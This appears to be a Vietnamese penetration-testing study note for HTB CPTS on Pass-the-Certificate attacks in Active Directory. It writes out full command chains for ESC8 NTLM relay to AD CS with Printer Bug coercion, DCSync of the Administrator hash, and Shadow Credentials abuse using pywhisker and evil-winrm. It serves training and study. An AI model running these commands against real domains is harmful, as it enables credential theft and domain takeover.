---
title: "Pass the Certificate"
date: 2026-04-16 11:15:36 +0700
categories: [HTB_CPTS, Post-Exploitation]
tags: [adcs, pass-the-certificate, active-directory, kerberos]
description: "HTB CPTS note về Pass the Certificate và certificate-based authentication."
pin: false
---
## Khái niệm

| Thuật ngữ                  | Giải thích                                                                              |
| -------------------------- | --------------------------------------------------------------------------------------- |
| **PKINIT**                 | Extension của Kerberos, cho phép xác thực bằng public key cryptography thay vì password |
| **Pass-the-Certificate**   | Dùng chứng chỉ X.509 (.pfx) để lấy TGT mà không cần password                            |
| **AD CS**                  | Active Directory Certificate Services — dịch vụ cấp chứng chỉ của Windows               |
| **msDS-KeyCredentialLink** | Thuộc tính AD lưu public key dùng cho PKINIT auth                                       |

> **Điểm mấu chốt Cả hai kỹ thuật bên dưới đều dẫn đến file `.pfx` → dùng `gettgtpkinit.py` lấy TGT → Pass-the-Ticket như bình thường.**

## Attack Flow tổng quát

```
Có cert (.pfx)
    │
    ▼
gettgtpkinit.py  ──►  TGT (.ccache)
    │
    ├──► DCSync (nếu là machine account của DC)
    └──► WinRM / PSExec / lateral movement
```

---
## 1. ESC8 – NTLM Relay vào AD CS

> **Điều kiện**
>
> - CA có bật **Web Enrollment** (HTTP)
> - Máy nạn nhân chạy **Print Spooler** service (để trigger Printer Bug)
> - Attacker có credential hợp lệ trong domain

### Bước 1 – Lắng nghe và relay (ntlmrelayx)

```bash
impacket-ntlmrelayx \
  -t http://<CA_IP>/certsrv/certfnsh.asp \
  --adcs \
  -smb2support \
  --template KerberosAuthentication
```

> `--template`: template mặc định cho DC auth. Enumerate bằng `certipy` nếu khác môi trường.

### Bước 2 – Coerce authentication (Printer Bug)

```bash
python3 printerbug.py \
  <DOMAIN>/<USER>:"<PASSWORD>"@<TARGET_DC_IP> \
  <ATTACKER_IP>
```

> Ép `<TARGET_DC>` tự gửi NTLM auth về máy attacker → bị relay sang CA → CA cấp `<DC_NAME>$.pfx`.

### Bước 3 – Lấy TGT từ cert

```bash
python3 gettgtpkinit.py \
  -cert-pfx <DC_NAME>$.pfx \
  -dc-ip <DC_IP> \
  '<DOMAIN>/<DC_NAME>$' \
  /tmp/dc.ccache
```

> Lưu lại **AS-REP encryption key** in ra trong output (cần cho một số bước sau).

### Bước 4 – DCSync lấy hash Administrator

```bash
export KRB5CCNAME=/tmp/dc.ccache

impacket-secretsdump \
  -k -no-pass \
  -dc-ip <DC_IP> \
  -just-dc-user Administrator \
  '<DOMAIN>/<DC_NAME>$'@<DC_FQDN>
```

---

## 2. Shadow Credentials (msDS-KeyCredentialLink)

> **Điều kiện**
>
> - Attacker có quyền **WriteProperty** trên `msDS-KeyCredentialLink` của victim user
> - Trong BloodHound: edge **`AddKeyCredentialLink`**

### Bước 1 – Ghi public key vào msDS-KeyCredentialLink

```bash
pywhisker \
  --dc-ip <DC_IP> \
  -d <DOMAIN> \
  -u <ATTACKER_USER> \
  -p '<ATTACKER_PASS>' \
  --target <VICTIM_USER> \
  --action add
```

Output trả về: file `<random>.pfx` + password cho file đó.

### Bước 2 – Lấy TGT của victim

```bash
python3 gettgtpkinit.py \
  -cert-pfx <RANDOM>.pfx \
  -pfx-pass '<PFX_PASSWORD>' \
  -dc-ip <DC_IP> \
  <DOMAIN>/<VICTIM_USER> \
  /tmp/<victim>.ccache
```

### Bước 3 – Pass-the-Ticket

```bash
export KRB5CCNAME=/tmp/<victim>.ccache
klist  # verify ticket
```

```bash
# Nếu victim thuộc Remote Management Users
evil-winrm -i <DC_FQDN> -r <DOMAIN>
```

---
## 3. Khi không dùng được PKINIT

> **Một số môi trường KDC không hỗ trợ EKU phù hợp → không lấy được TGT bằng cert.**

Dùng **PassTheCert** thay thế:

- Xác thực qua **LDAPS** bằng cert
- Thực hiện: đổi password, cấp quyền DCSync

→ Tham khảo: https://github.com/AlmondOffSec/PassTheCert

---
